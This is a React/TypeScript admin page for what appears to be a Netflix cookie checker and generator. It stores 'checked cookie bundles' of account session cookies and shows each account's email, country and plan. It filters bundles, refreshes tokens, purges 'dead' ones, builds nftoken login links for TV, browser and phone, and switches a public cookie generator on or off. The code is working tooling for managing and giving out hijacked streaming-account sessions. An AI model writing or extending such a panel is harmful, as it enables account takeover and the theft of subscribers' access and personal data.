import { useEffect, useState } from "react";
import type { FormEvent } from "react";
import axios from "axios";
import { formatPhtDateTime } from "../utils/date";

const DEFAULT_GENERATOR_MAINTENANCE_MESSAGE =
  "Under maintenance. Please come back later.";

type StoredBundle = {
  id: number;
  storage_position: number;
  checked_at: string;
  account_success: boolean;
  token_success: boolean;
  account: Record<string, unknown> | null;
  token: Record<string, unknown>;
  cookies: Array<{ name: string; value: string; domain?: string }>;
};

type GeneratorSettings = {
  enabled: boolean;
  message: string;
};

type StorageHealth = {
  total_count: number;
  dead_count: number;
  last_checked_at: string | null;
  next_check_at: string | null;
  is_checking: boolean;
};

type PlanCategory = "Basic" | "Standard" | "Premium" | "Other";
type PlanFilter = "all" | PlanCategory;

const EMPTY_STORAGE_HEALTH: StorageHealth = {
  total_count: 0,
  dead_count: 0,
  last_checked_at: null,
  next_check_at: null,
  is_checking: false,
};

const getAccountField = (item: StoredBundle, field: string): unknown => {
  if (!item.account || typeof item.account !== "object") return undefined;
  return item.account[field];
};

export default function AdminCookies({ onBack }: { onBack: () => void }) {
  const [isAdmin, setIsAdmin] = useState(false);
  const [password, setPassword] = useState("");
  const [items, setItems] = useState<StoredBundle[]>([]);
  const [generatorSettings, setGeneratorSettings] = useState<GeneratorSettings>({
    enabled: true,
    message: DEFAULT_GENERATOR_MAINTENANCE_MESSAGE,
  });
  const [storageHealth, setStorageHealth] = useState<StorageHealth>(
    EMPTY_STORAGE_HEALTH,
  );
  const [planFilter, setPlanFilter] = useState<PlanFilter>("all");
  const [countryFilter, setCountryFilter] = useState("all");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(true);
  const [refreshingId, setRefreshingId] = useState<number | null>(null);
  const [settingsSaving, setSettingsSaving] = useState(false);
  const [lockoutSeconds, setLockoutSeconds] = useState(0);

  const loadItems = async () => {
    const response = await axios.get("/api/admin/checked-cookies");
    setItems(response.data.items || []);
    setStorageHealth(response.data.health || EMPTY_STORAGE_HEALTH);
  };

  const loadGeneratorSettings = async () => {
    const response = await axios.get("/api/generator/status");
    setGeneratorSettings({
      enabled: Boolean(response.data.enabled),
      message:
        typeof response.data.message === "string" && response.data.message.trim()
          ? response.data.message
          : DEFAULT_GENERATOR_MAINTENANCE_MESSAGE,
    });
  };

  useEffect(() => {
    axios
      .get("/api/admin/session")
      .then(async ({ data }) => {
        setIsAdmin(data.is_admin);
        setLockoutSeconds(Math.max(0, Number(data.login_lockout_seconds) || 0));
        if (data.is_admin) {
          await Promise.all([loadItems(), loadGeneratorSettings()]);
        }
      })
      .catch(() => setError("Unable to verify admin access."))
      .finally(() => setLoading(false));
  }, []);

  useEffect(() => {
    if (lockoutSeconds <= 0) return;

    const timer = window.setInterval(() => {
      setLockoutSeconds((current) => Math.max(0, current - 1));
    }, 1000);

    return () => window.clearInterval(timer);
  }, [lockoutSeconds]);

  useEffect(() => {
    if (!isAdmin) return;

    const timer = window.setInterval(() => {
      loadItems().catch(() => undefined);
    }, 60_000);

    return () => window.clearInterval(timer);
  }, [isAdmin]);

  const formatLockout = (seconds: number) =>
    `${Math.floor(seconds / 60)}:${String(seconds % 60).padStart(2, "0")}`;

  const login = async (event: FormEvent) => {
    event.preventDefault();
    if (lockoutSeconds > 0) return;
    setError("");
    setLoading(true);
    try {
      await axios.post("/api/admin/login", { password });
      setPassword("");
      setIsAdmin(true);
      await Promise.all([loadItems(), loadGeneratorSettings()]);
    } catch (err: any) {
      if (err.response?.status === 429) {
        const retryAfter = Number(err.response.headers?.["retry-after"]);
        setLockoutSeconds(
          Number.isFinite(retryAfter) && retryAfter > 0
            ? retryAfter
            : 5 * 60,
        );
        setError("Too many incorrect password attempts.");
      } else {
        setError(err.response?.data?.detail || "Login failed.");
      }
    } finally {
      setLoading(false);
    }
  };

  const logout = async () => {
    await axios.post("/api/admin/logout");
    setIsAdmin(false);
    setItems([]);
  };

  const saveGeneratorSettings = async (enabled = generatorSettings.enabled) => {
    const message = generatorSettings.message.trim();
    if (!message) {
      setError("Maintenance message cannot be empty.");
      return;
    }

    setError("");
    setSettingsSaving(true);
    try {
      const response = await axios.post("/api/admin/generator/settings", {
        enabled,
        message,
      });
      setGeneratorSettings({
        enabled: Boolean(response.data.enabled),
        message: response.data.message || message,
      });
    } catch (err: any) {
      setError(
        err.response?.data?.detail || "Unable to update generator settings.",
      );
    } finally {
      setSettingsSaving(false);
    }
  };

  const remove = async (id: number) => {
    if (!window.confirm("Delete this stored cookie bundle?")) return;
    await axios.delete(`/api/admin/checked-cookies/${id}`);
    setItems((current) => current.filter((item) => item.id !== id));
  };

  const deleteDead = async () => {
    if (!window.confirm("Delete all dead stored cookie bundles?")) return;
    setError("");
    try {
      const response = await axios.delete("/api/admin/checked-cookies/dead");
      const deleted = Number(response.data.deleted || 0);
      if (deleted > 0) {
        setItems((current) =>
          current.filter(
            (item) =>
              !(item.account_success === false && item.token_success === false),
          ),
        );
      }
      if (response.data.health) {
        setStorageHealth(response.data.health);
      }
      setError(
        deleted > 0
          ? `${deleted} dead bundle${deleted === 1 ? "" : "s"} removed.`
          : "No dead bundles were removed.",
      );
    } catch (err: any) {
      setError(
        err.response?.data?.detail || "Unable to delete dead cookie bundles.",
      );
    }
  };

  const refreshBundle = async (id: number) => {
    setError("");
    setRefreshingId(id);
    try {
      const response = await axios.post(
        `/api/admin/checked-cookies/${id}/refresh`,
      );
      const refreshed = response.data;
      setItems((current) =>
        current.map((item) =>
          item.id === id
            ? {
                ...item,
                checked_at: refreshed.checked_at || new Date().toISOString(),
                account_success:
                  refreshed.account_success ?? item.account_success,
                token_success: Boolean(refreshed.token?.success),
                account: refreshed.account || item.account,
                token: refreshed.token || item.token,
              }
            : item,
        ),
      );
      if (!refreshed.success) {
        setError(
          refreshed.token?.error ||
            `Unable to refresh token for bundle #${id}.`,
        );
      }
      await loadItems();
    } catch (err: any) {
      setError(
        err.response?.data?.detail ||
          `Unable to refresh token for bundle #${id}.`,
      );
    } finally {
      setRefreshingId(null);
    }
  };

  const buildLinks = (token: Record<string, unknown> | undefined) => {
    const nftoken = typeof token?.nftoken === "string" ? token.nftoken : "";
    if (!nftoken) return {};

    return {
      tv: `https://www.netflix.com/tv2?nftoken=${encodeURIComponent(nftoken)}`,
      netflix: `https://netflix.com/?nftoken=${encodeURIComponent(nftoken)}`,
      phone: `https://www.netflix.com/unsupported?nftoken=${encodeURIComponent(nftoken)}`,
    };
  };

  const getPlanCategory = (item: StoredBundle): PlanCategory => {
    const plan = String(getAccountField(item, "plan") || "").toLowerCase();
    if (plan.includes("premium")) return "Premium";
    if (plan.includes("standard")) return "Standard";
    if (plan.includes("basic")) return "Basic";
    return "Other";
  };

  const getCountryLabel = (item: StoredBundle) =>
    String(getAccountField(item, "country") || "Unknown country").trim() ||
    "Unknown country";

  const planCounts = items.reduce<Record<PlanCategory, number>>(
    (counts, item) => {
      counts[getPlanCategory(item)] += 1;
      return counts;
    },
    { Basic: 0, Standard: 0, Premium: 0, Other: 0 },
  );

  const countryOptions = Array.from(
    new Set(items.map((item) => getCountryLabel(item))),
  ).sort((left, right) =>
    left.localeCompare(right, undefined, { sensitivity: "base", numeric: true }),
  );

  const filteredItems = items
    .filter((item) => {
      const matchesPlan =
        planFilter === "all" || getPlanCategory(item) === planFilter;
      const matchesCountry =
        countryFilter === "all" || getCountryLabel(item) === countryFilter;
      return matchesPlan && matchesCountry;
    })
    .sort((left, right) => left.storage_position - right.storage_position);

  if (loading)
    return (
      <main className="admin-page">
        <p>Loading admin storage…</p>
      </main>
    );

  if (!isAdmin) {
    return (
      <main className="admin-page">
        <button className="secondary-button" onClick={onBack}>
          ← Back to checker
        </button>
        <form className="admin-login" onSubmit={login}>
          <span className="eyebrow">Restricted area</span>
          <h2>Admin cookie storage</h2>
          <p>Enter the admin password to view checked cookie bundles.</p>
          <input
            type="password"
            value={password}
            onChange={(event) => setPassword(event.target.value)}
            placeholder="Admin password"
            autoComplete="current-password"
            maxLength={32}
            disabled={loading || lockoutSeconds > 0}
            required
          />
          {error && <p className="admin-error">{error}</p>}
          {lockoutSeconds > 0 && (
            <p className="admin-lockout">
              Try again in {formatLockout(lockoutSeconds)}.
            </p>
          )}
          <button
            type="submit"
            className="btn btn-primary admin-login-submit"
            disabled={loading || lockoutSeconds > 0}
          >
            {lockoutSeconds > 0
              ? `Locked · ${formatLockout(lockoutSeconds)}`
              : loading
                ? "Signing in…"
                : "Sign in"}
          </button>
        </form>
      </main>
    );
  }

  return (
    <main className="admin-page">
      <div className="admin-toolbar">
        <div>
          <span className="eyebrow">Admin only</span>
          <h2>Checked cookie storage</h2>
          <p>
            {items.length} stored bundle{items.length === 1 ? "" : "s"}
          </p>
          <div
            className={`dead-bundle-indicator ${
              storageHealth.dead_count > 0 ? "has-dead" : "is-clear"
            }`}
          >
            <strong>Dead bundles: {storageHealth.dead_count}</strong>
            <small>
              {storageHealth.is_checking
                ? "Checking all accounts…"
                : storageHealth.last_checked_at
                  ? `Last checked ${formatPhtDateTime(storageHealth.last_checked_at)}`
                  : "First health check pending"}
            </small>
          </div>
        </div>
        <div className="admin-actions">
          <button type="button" className="secondary-button" onClick={deleteDead}>
            Delete dead cookies
          </button>
          <button type="button" className="secondary-button" onClick={logout}>
            Sign out
          </button>
        </div>
      </div>
      {error && <p className="admin-error">{error}</p>}
      <section className="admin-storage-overview" aria-label="Storage overview">
        <div className="admin-plan-summary">
          <span className="admin-overview-label">Plan totals</span>
          {(["Basic", "Standard", "Premium"] as const).map((plan) => (
            <span className="admin-plan-count" key={plan}>
              <strong>{planCounts[plan]}</strong>
              {plan}
            </span>
          ))}
          {planCounts.Other > 0 && (
            <span className="admin-plan-count admin-plan-count-muted">
              <strong>{planCounts.Other}</strong>
              Other
            </span>
          )}
        </div>
        <div className="admin-filter-controls">
          <label className="admin-filter-control">
            <span className="admin-overview-label">Plan</span>
            <select
              value={planFilter}
              onChange={(event) =>
                setPlanFilter(event.target.value as PlanFilter)
              }
            >
              <option value="all">All plans</option>
              <option value="Basic">Basic</option>
              <option value="Standard">Standard</option>
              <option value="Premium">Premium</option>
              {planCounts.Other > 0 && <option value="Other">Other</option>}
            </select>
          </label>
          <label className="admin-filter-control">
            <span className="admin-overview-label">Country</span>
            <select
              value={countryFilter}
              onChange={(event) => setCountryFilter(event.target.value)}
            >
              <option value="all">All countries</option>
              {countryOptions.map((country) => (
                <option value={country} key={country}>
                  {country}
                </option>
              ))}
            </select>
          </label>
          <span className="admin-filter-result">
            Showing {filteredItems.length} of {items.length}
          </span>
        </div>
      </section>
      <details className="generator-settings-card">
        <summary className="generator-settings-summary">
          <div>
            <span className="eyebrow">Cookie generator</span>
            <strong>Generator settings</strong>
          </div>
          <span
            className={`generator-settings-status ${
              generatorSettings.enabled ? "is-enabled" : "is-disabled"
            }`}
          >
            {generatorSettings.enabled ? "Enabled" : "Disabled"}
          </span>
        </summary>
        <div className="generator-settings-body">
          <div className="generator-settings-header">
            <div>
              <h3>{generatorSettings.enabled ? "Generator enabled" : "Generator disabled"}</h3>
              <p>
                Visitors see the maintenance message while the generator is disabled.
              </p>
            </div>
          </div>
          <label className="generator-settings-label" htmlFor="generator-maintenance-message">
            Maintenance message
          </label>
          <textarea
            id="generator-maintenance-message"
            className="generator-settings-input"
            value={generatorSettings.message}
            onChange={(event) =>
              setGeneratorSettings((current) => ({
                ...current,
                message: event.target.value,
              }))
            }
            maxLength={500}
            rows={3}
            disabled={settingsSaving}
          />
          <div className="admin-actions generator-settings-actions">
            <button
              className={generatorSettings.enabled ? "danger-button" : "btn btn-primary"}
              onClick={() => saveGeneratorSettings(!generatorSettings.enabled)}
              disabled={settingsSaving}
            >
              {settingsSaving
                ? "Saving…"
                : generatorSettings.enabled
                  ? "Disable cookie generator"
                  : "Enable cookie generator"}
            </button>
            <button
              className="secondary-button"
              onClick={() => saveGeneratorSettings()}
              disabled={settingsSaving}
            >
              Save message
            </button>
          </div>
        </div>
      </details>
      {items.length === 0 ? (
        <section className="admin-empty">
          No checked cookie bundles have been stored yet.
        </section>
      ) : filteredItems.length === 0 ? (
        <section className="admin-empty">
          No stored bundles match the selected plan and country.
        </section>
      ) : (
        <section className="stored-grid">
          {filteredItems.map((item) => {
            const links = buildLinks(
              item.token as Record<string, unknown> | undefined,
            );
            const bundleAlive = item.account_success || item.token_success;

            return (
              <article className="stored-card" key={item.id}>
                <div className="stored-card-header">
                  <div>
                    <strong>Cookie #{item.storage_position}</strong>
                    <small>{formatPhtDateTime(item.checked_at)}</small>
                  </div>
                  <div className="admin-actions">
                    <button
                      className="secondary-button"
                      onClick={() => refreshBundle(item.id)}
                      disabled={refreshingId === item.id}
                    >
                      {refreshingId === item.id ? "Refreshing…" : "Refresh token"}
                    </button>
                    <button
                      className="danger-button"
                      onClick={() => remove(item.id)}
                    >
                      Delete
                    </button>
                  </div>
                </div>
                <div className="status-row">
                  <span
                    className={
                      bundleAlive ? "status-ok" : "status-bad"
                    }
                  >
                    Account {bundleAlive ? "alive" : "dead"}
                  </span>
                  <span
                    className={item.token_success ? "status-ok" : "status-bad"}
                  >
                    Token {item.token_success ? "alive" : "dead"}
                  </span>
                </div>
                <p>
                  {String(getAccountField(item, "email") || "No email")} ·{" "}
                  {String(
                    getAccountField(item, "country") || "Unknown country",
                  )}{" "}
                  · {String(getAccountField(item, "plan") || "Unknown plan")}
                </p>

                {Object.keys(links).length > 0 && (
                  <div
                    className="status-row"
                    style={{ marginTop: "0.75rem", flexWrap: "wrap" }}
                  >
                    {Object.entries(links).map(([label, url]) => (
                      <a
                        key={label}
                        href={url}
                        target="_blank"
                        rel="noreferrer"
                        className="secondary-button"
                      >
                        {label === "tv"
                          ? "TV Login"
                          : label === "netflix"
                            ? "Open in Netflix"
                            : "Phone Login"}
                      </a>
                    ))}
                  </div>
                )}

                <details>
                  <summary>{item.cookies.length} cookies</summary>
                  <pre>{JSON.stringify(item.cookies, null, 2)}</pre>
                </details>
              </article>
            );
          })}
        </section>
      )}
    </main>
  );
}
